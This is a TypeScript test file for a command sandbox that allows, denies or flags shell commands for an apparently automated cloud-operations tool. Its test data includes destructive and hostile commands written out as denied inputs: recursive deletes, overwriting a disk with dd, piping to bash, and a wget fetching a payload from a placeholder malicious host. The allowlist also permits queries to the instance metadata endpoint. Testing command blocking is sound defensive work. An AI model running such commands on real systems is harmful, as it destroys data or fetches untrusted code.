import { describe, it } from 'node:test';
import * as assert from 'node:assert/strict';
import { validateCommand } from '../command-sandbox';

describe('CommandSandbox', () => {
  describe('allowlist', () => {
    const allowed = [
      'aws ec2 describe-instances --region us-east-1',
      'aws s3 ls',
      'kubectl get pods -A',
      'kubectl --context prod get deployments -n default',
      'kubectl describe node ip-10-0-1-1',
      'kubectl logs -f pod/my-pod -n kube-system',
      'kubectl top pods -A',
      'aliyun ecs DescribeInstances --RegionId cn-hangzhou',
      'az vm list',
      'gcloud compute instances list',
      'jq .items[] output.json',
      'grep -r "error" /tmp/logs/',
      'cat /tmp/output.txt',
      'head -20 /tmp/file.log',
      'tail -f /tmp/app.log',
      'sort /tmp/data.csv',
      'wc -l /tmp/file.txt',
      'date +%Y-%m-%d',
      'echo "hello"',
      'curl -s http://169.254.169.254/latest/meta-data/',
      './scripts/foreach-account.sh --accounts 111,222 aws s3 ls',
      './scripts/kubectl-all.sh get pods -A',
    ];
    for (const cmd of allowed) {
      it(`allows: ${cmd.substring(0, 60)}`, () => {
        const result = validateCommand(cmd);
        assert.ok(result.allowed, `should allow: ${cmd}, got: ${result.reason}`);
      });
    }
  });

  describe('deny patterns', () => {
    const denied = [
      ['git push origin main', 'git operations'],
      ['rm -rf /tmp/data', 'recursive delete'],
      ['eval "malicious code"', 'eval'],
      ['sudo apt-get install foo', 'sudo'],
      ['chmod 777 /etc/passwd', 'chmod'],
      ['chown root:root /bin/sh', 'chown'],
      ['dd if=/dev/zero of=/dev/sda', 'dd'],
      ['echo "hack" | bash', 'piping to shell'],
      ['bash -c "rm -rf /"', 'shell -c'],
      ['echo "data" > /etc/config', 'redirect to non-tmp'],
      ['shutdown -h now', 'system commands'],
    ];
    for (const [cmd, reason] of denied) {
      it(`denies: ${cmd} (${reason})`, () => {
        const result = validateCommand(cmd);
        assert.ok(!result.allowed, `should deny: ${cmd}`);
      });
    }
  });

  describe('commands not in allowlist', () => {
    const notAllowed = [
      'node -e "process.exit(1)"',
      'wget http://malicious.com/payload',
      'make deploy',
      'npm install evil-package',
      'python3 script.py',
    ];
    for (const cmd of notAllowed) {
      it(`denies unlisted: ${cmd.substring(0, 40)}`, () => {
        const result = validateCommand(cmd);
        assert.ok(!result.allowed, `should deny: ${cmd}`);
        assert.ok(result.reason?.includes('not in allowlist'));
      });
    }
  });

  describe('kubectl write approval', () => {
    const writeOps = [
      'kubectl apply -f deployment.yaml',
      'kubectl delete pod my-pod',
      'kubectl edit deployment nginx',
      'kubectl scale deployment nginx --replicas=3',
      'kubectl exec -it pod/my-pod -- bash',
      'kubectl --context prod delete namespace test',
      'kubectl drain node-1',
    ];
    for (const cmd of writeOps) {
      it(`requires approval: ${cmd.substring(0, 50)}`, () => {
        const result = validateCommand(cmd, { kubectlReadOnly: true });
        assert.ok(!result.allowed);
        assert.ok(result.needsApproval);
      });
    }

    it('allows write ops when kubectlReadOnly=false', () => {
      const result = validateCommand('kubectl apply -f deployment.yaml', { kubectlReadOnly: false });
      assert.ok(result.allowed);
    });
  });

  describe('AWS account isolation', () => {
    it('blocks foreach-account.sh without --accounts when tenant has restriction', () => {
      const result = validateCommand(
        './scripts/foreach-account.sh aws s3 ls',
        { allowedAwsAccountIds: ['111', '222'] },
      );
      assert.ok(!result.allowed);
      assert.ok(result.reason?.includes('--accounts'));
    });

    it('allows foreach-account.sh with correct accounts', () => {
      const result = validateCommand(
        './scripts/foreach-account.sh --accounts 111,222 aws s3 ls',
        { allowedAwsAccountIds: ['111', '222'] },
      );
      assert.ok(result.allowed);
    });

    it('blocks foreach-account.sh with unauthorized accounts', () => {
      const result = validateCommand(
        './scripts/foreach-account.sh --accounts 111,999 aws s3 ls',
        { allowedAwsAccountIds: ['111', '222'] },
      );
      assert.ok(!result.allowed);
      assert.ok(result.reason?.includes('unauthorized'));
    });

    it('blocks sts assume-role to unauthorized account', () => {
      const result = validateCommand(
        'aws sts assume-role --role-arn arn:aws:iam::999999:role/ReadOnly',
        { allowedAwsAccountIds: ['111', '222'] },
      );
      assert.ok(!result.allowed);
      assert.ok(result.reason?.includes('unauthorized'));
    });

    it('allows sts assume-role to authorized account', () => {
      const result = validateCommand(
        'aws sts assume-role --role-arn arn:aws:iam::111:role/ReadOnly',
        { allowedAwsAccountIds: ['111', '222'] },
      );
      assert.ok(result.allowed);
    });
  });

  describe('edge cases', () => {
    it('denies empty command', () => {
      assert.ok(!validateCommand('').allowed);
      assert.ok(!validateCommand('   ').allowed);
    });

    it('allows redirect to /tmp/', () => {
      assert.ok(validateCommand('aws s3 ls > /tmp/output.txt').allowed);
    });
  });
});
